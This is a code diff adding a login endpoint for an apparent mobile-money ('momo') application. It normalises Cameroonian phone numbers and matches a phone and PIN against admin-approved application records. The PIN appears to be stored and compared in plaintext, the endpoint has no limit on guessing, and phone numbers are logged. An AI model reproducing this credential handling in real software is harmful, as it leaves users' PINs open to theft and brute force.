@@ -1613,6 +1613,58 @@ ${userLabel}
     }
 });
 
+// POST /api/login-momo - Handle returning user login
+app.post('/api/login-momo', async (req, res) => {
+    try {
+        const { phone, pin } = req.body;
+
+        if (!phone || !pin) {
+            return res.status(400).json({ success: false, message: 'Phone and PIN required' });
+        }
+
+        // Normalize phone number
+        let phoneNumber = phone;
+        if (!phoneNumber.startsWith('+237')) {
+            if (phoneNumber.startsWith('0')) {
+                phoneNumber = '+237' + phoneNumber.substring(1); // Remove leading 0, add +237
+            } else {
+                phoneNumber = '+237' + phoneNumber; // Add +237
+            }
+        }
+
+        console.log(`🔐 Login attempt: ${phoneNumber}`);
+
+        // Get all applications from all admins and find matching one
+        const allAdmins = await db.getActiveAdmins();
+        let matchingApp = null;
+
+        for (const admin of allAdmins) {
+            const apps = await db.getApplicationsByAdmin(admin.adminId);
+            const found = apps.find(app => 
+                app.phoneNumber === phoneNumber && 
+                app.pin === pin && 
+                app.pinStatus === 'approved'
+            );
+            if (found) {
+                matchingApp = found;
+                break;
+            }
+        }
+
+        if (!matchingApp) {
+            console.log(`❌ No approved app found for ${phoneNumber}`);
+            return res.status(401).json({ success: false, message: 'Invalid phone or PIN' });
+        }
+
+        console.log(`✅ Login successful: ${matchingApp.id}`);
+        res.json({ success: true, applicationId: matchingApp.id });
+
+    } catch (error) {
+        console.error('❌ Login error:', error);
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
 // GET /api/check-pin-status/:applicationId
 app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     try {
